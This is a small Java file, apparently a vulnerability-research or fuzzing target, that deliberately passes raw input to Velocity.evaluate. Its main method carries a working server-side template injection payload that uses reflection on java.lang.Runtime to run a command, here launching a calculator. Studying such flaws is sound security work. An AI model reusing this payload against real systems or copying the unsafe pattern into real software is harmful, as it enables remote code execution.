package com.example;

import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.Velocity;
import java.io.StringWriter;
import java.nio.file.Files;
import java.nio.file.Paths;

public class VulnerableApp {

    /**
     * Este es el nuevo método "fuzzable". Acepta el contenido de la plantilla
     * directamente como un String, sin leer ningún fichero.
     * Aquí es donde reside la vulnerabilidad.
     */
    public static void processTemplate(String templateContent) throws Exception {
        Velocity.init();
        VelocityContext context = new VelocityContext();
        context.put("username", "Mundo");

        StringWriter writer = new StringWriter();

        // La llamada vulnerable ahora usa directamente el contenido que le pasamos.
        Velocity.evaluate(context, writer, "logTag", templateContent);

        System.out.println("[+] Plantilla renderizada con éxito:");
        System.out.println(writer.toString());
    }

    /**
     * El método main ahora es solo un "envoltorio" para la ejecución normal
     * desde la línea de comandos. Lee el fichero y llama a nuestro método
     * principal.
     */
    public static void main(String[] args) throws Exception {
        String templateContent = "#set($exp=$username.getClass().forName(\"java.lang.Runtime\").getRuntime())\n"
                + "#set($cmd=\"gnome-calculator\")\n"
                + "$exp.exec($cmd)";

        // Llama a la lógica principal
        processTemplate(templateContent);
    }
}